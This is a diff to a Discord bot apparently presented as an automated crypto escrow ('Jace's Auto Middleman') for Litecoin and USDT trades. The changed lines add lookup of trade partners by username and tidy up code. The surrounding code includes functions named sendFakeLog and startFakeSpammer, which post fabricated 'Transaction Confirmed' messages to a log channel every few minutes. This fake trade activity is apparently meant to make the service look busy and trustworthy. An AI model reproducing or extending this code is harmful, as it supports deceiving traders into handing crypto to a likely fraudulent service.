@@ -24,6 +24,7 @@ const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.GuildMembers,
     GatewayIntentBits.MessageContent,
   ],
 });
@@ -40,7 +41,6 @@ const activeTurns = new Map();
 let logChannelId = null;
 let panelCategoryId = null;
 
-// Load config on startup
 function loadConfig() {
   const logRow = db.prepare("SELECT value FROM config WHERE key='logChannel'").get();
   if (logRow) logChannelId = logRow.value;
@@ -70,7 +70,6 @@ async function sendFakeLog(channelId, withRelease = false) {
   const receiver = Math.random() > 0.8 ? '@SOPHIE' : 'Anonymous';
 
   if (withRelease) {
-    // Transaction detected first
     const detectedEmbed = new EmbedBuilder()
       .setTitle('⚠️ Transaction Detected')
       .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.')
@@ -82,7 +81,6 @@ async function sendFakeLog(channelId, withRelease = false) {
 
     await channel.send({ embeds: [detectedEmbed] });
 
-    // Release after 15 seconds
     setTimeout(async () => {
       const confirmEmbed = new EmbedBuilder()
         .setTitle('✅ Transaction Confirmed!')
@@ -124,7 +122,7 @@ async function sendFakeLog(channelId, withRelease = false) {
 function startFakeSpammer() {
   setInterval(async () => {
     if (!logChannelId) return;
-    const delay = Math.random() * 120000 + 120000; // 2-4 minutes
+    const delay = Math.random() * 120000 + 120000;
     setTimeout(() => sendFakeLog(logChannelId), delay);
   }, 60000);
 }
@@ -176,7 +174,6 @@ async function handleSlashCommand(interaction) {
   const { commandName } = interaction;
 
   if (commandName === 'panel') {
-    // Main panel embed - Jace's style
     const mainEmbed = new EmbedBuilder()
       .setTitle("Jace's Auto Middleman")
       .setDescription('• Paid Service\n• Read our ToS before using the bot: <#tos-crypto>')
@@ -186,13 +183,11 @@ async function handleSlashCommand(interaction) {
       new ButtonBuilder().setLabel('Tutorial').setStyle(ButtonStyle.Link).setURL('https://example.com').setEmoji('🔗')
     );
 
-    // Fees embed
     const feesEmbed = new EmbedBuilder()
       .setTitle('Fees:')
       .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
       .setColor(0x2B2D31);
 
-    // LTC section
     const ltcEmbed = new EmbedBuilder()
       .setTitle('• Request Litecoin •')
       .setColor(0x2B2D31);
@@ -201,7 +196,6 @@ async function handleSlashCommand(interaction) {
       new ButtonBuilder().setCustomId('request_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('🪙')
     );
 
-    // USDT section
     const usdtEmbed = new EmbedBuilder()
       .setTitle('• Request USDT [BEP-20] •')
       .setDescription('• Network: **BSC (BEP-20)**')
@@ -337,15 +331,31 @@ async function handleModal(interaction) {
 
 async function handleTradeDetailsModal(interaction) {
   const isLtc = interaction.customId === 'ltc_modal';
-  const otherUserId = interaction.fields.getTextInputValue('otherUserId').trim().replace(/[<@!>]/g, '');
+  const rawInput = interaction.fields.getTextInputValue('otherUserId').trim();
   const youGiving = interaction.fields.getTextInputValue('youGiving').trim();
   const theyGiving = interaction.fields.getTextInputValue('theyGiving').trim();
+
+  // Extract ID from mention or use raw input
+  let otherUserId = rawInput.replace(/[<@!>]/g, '');
+  
+  // Try to resolve by username if not an ID
+  if (!/^\d+$/.test(otherUserId)) {
+    try {
+      const members = await interaction.guild.members.fetch({ query: rawInput, limit: 1 });
+      if (members.size > 0) {
+        otherUserId = members.first().id;
+      }
+    } catch (e) {
+      console.log('Fetch by username failed:', e.message);
+    }
+  }
 
   let otherMember;
   try {
     otherMember = await interaction.guild.members.fetch(otherUserId);
-  } catch {
-    return interaction.reply({ content: '❌ Invalid user ID. User must be in this server.', flags: MessageFlags.Ephemeral });
+  } catch (err) {
+    console.error('Failed to fetch member:', err.message);
+    return interaction.reply({ content: `❌ Could not find user "${rawInput}" in this server. Make sure they are a member.`, flags: MessageFlags.Ephemeral });
   }
 
   if (otherUserId === interaction.user.id) {
@@ -376,7 +386,6 @@ async function handleTradeDetailsModal(interaction) {
 
   await interaction.reply({ content: `✅ Trade channel created: ${channel}`, flags: MessageFlags.Ephemeral });
 
-  // Welcome embed
   const embed = new EmbedBuilder()
     .setTitle("👋 Jace's Auto Middleman Service")
     .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.')
@@ -392,7 +401,6 @@ async function handleTradeDetailsModal(interaction) {
 
   await channel.send({ content: `${interaction.user} ${otherMember}`, embeds: [embed], components: [deleteRow] });
 
-  // Role selection
   const roleEmbed = new EmbedBuilder()
     .setDescription('**Select your role**\n• **"Sender"** if you are **Sending** crypto to the bot.\n• **"Receiver"** if you are **Receiving** crypto from the bot.')
     .setColor(0x5865F2);
@@ -599,7 +607,6 @@ async function handleAmountModal(interaction) {
     return interaction.reply({ content: '❌ Not your turn!', flags: MessageFlags.Ephemeral });
   }
 
-  // Jace's fee structure
   let fee = 0.50;
   if (amount >= 250) fee = 1.50;
   if (amount < 50) fee = 0;
@@ -734,6 +741,8 @@ async function handleEnterAddress(interaction) {
     return interaction.reply({ content: '❌ Not your turn!', flags: MessageFlags.Ephemeral });
   }
 
+  const isLtc = trade.type === 'ltc';
+
   const modal = new ModalBuilder()
     .setCustomId(`address_modal_${tradeId}`)
     .setTitle('Enter Your Address');
@@ -743,7 +752,7 @@ async function handleEnterAddress(interaction) {
       new TextInputBuilder()
         .setCustomId('address')
         .setLabel('Address')
-        .setPlaceholder(isLtc(trade) ? LTC_ADDRESS : USDC_ADDRESS)
+        .setPlaceholder(isLtc ? LTC_ADDRESS : USDC_ADDRESS)
         .setStyle(TextInputStyle.Short)
         .setRequired(true)
     )
@@ -768,10 +777,6 @@ async function handleAddressModal(interaction) {
   );
 
   await interaction.reply({ embeds: [embed], components: [row] });
-}
-
-function isLtc(trade) {
-  return trade.type === 'ltc';
 }
 
 client.login(DISCORD_TOKEN);
